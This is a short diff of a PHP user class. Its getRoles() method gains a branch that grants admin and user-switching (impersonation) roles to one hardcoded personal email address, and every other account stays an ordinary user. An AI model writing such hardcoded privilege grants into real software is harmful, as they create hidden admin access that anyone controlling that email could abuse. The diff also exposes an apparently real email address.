@@ -163,10 +163,13 @@ class Registration implements UserInterface, \Serializable
      * and populated in any number of different ways when the user object
      * is created.
      *
-     * @return (Role|string)[] The user roles
+     * @return string[] The user roles
      */
-    public function getRoles()
+    public function getRoles() : array
     {
+        if($this->getEmail() === 'm.remmos@gmail.com') {
+            return array('ROLE_USER', 'ROLE_ADMIN', 'ROLE_ALLOWED_TO_SWITCH');
+        }
         return array('ROLE_USER');
     }
 
